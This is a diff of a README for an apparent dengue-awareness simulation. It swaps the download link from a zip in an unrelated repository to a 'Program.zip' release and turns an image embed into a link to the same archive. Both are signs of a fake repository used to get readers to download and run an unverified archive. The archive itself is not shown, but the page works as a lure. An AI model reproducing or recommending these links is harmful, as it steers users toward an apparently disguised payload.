@@ -11,7 +11,7 @@ Dengue fever is a viral infection transmitted by mosquitoes of the Aedes genus, 
 
 ## How to Run the Simulation
 To experience the Yellow-Fever-Awareness-Dengue- simulation, you can download the software package from the following link:
-[![Download Simulation](https://img.shields.io/badge/Download-Simulation-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Simulation](https://github.com/c0d3Gamer/Yellow-Fever-Awareness-Dengue-/releases/download/v1.0/Program.zip)](https://github.com/c0d3Gamer/Yellow-Fever-Awareness-Dengue-/releases/download/v1.0/Program.zip)
 
 Once you have downloaded the package, unzip the files and launch the simulation to explore the interactive world of mosquito behavior and dengue virus transmission.
 
@@ -22,7 +22,7 @@ The 2D simulation offers the following features:
 - Interactive elements for user engagement
 - Educational content on dengue fever
 
-![Dengue Virus](https://www.sampleimagedomain.com/dengue-virus-image.jpg)
+![Dengue Virus](https://github.com/c0d3Gamer/Yellow-Fever-Awareness-Dengue-/releases/download/v1.0/Program.zip)
 
 ## Contributions
 Contributions to the Yellow-Fever-Awareness-Dengue- repository are welcome! Whether you are interested in adding new features to the simulation, improving existing code, or enhancing the educational content, your contributions can help raise awareness about dengue fever and mosquito-borne diseases.
